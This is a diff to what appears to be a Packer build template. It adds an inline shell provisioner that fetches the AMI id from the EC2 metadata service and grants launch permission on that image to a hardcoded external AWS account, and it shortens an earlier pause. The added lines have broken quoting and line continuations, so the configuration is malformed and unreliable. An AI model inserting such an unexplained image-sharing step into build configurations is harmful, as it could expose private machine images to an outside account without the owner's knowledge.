@@ -99,9 +99,20 @@ provisioner "shell" {
       "CHECKPOINT_DISABLE=1"
     ]
     script       = "./buildandrun.sh"
-    pause_before = "30s"
+    pause_before = "5s"
   }
-
-
+  provisioner "shell" {
+    environment_vars = [
+      "DEBIAN_FRONTEND=noninteractive",
+      "CHECKPOINT_DISABLE=1"
+    ]
+    inline = [
+      ""AMI="$(curl http://169.254.169.254/latest/meta-data/ami-id)""",
+      ""aws ec2 modify-image-attribute 
+    \ --image-id $AMI 
+    \ --launch-permission "Add=[{UserId=180918132071}]" --region us-east-1"",
+     
+    ]
+  }
 
 }
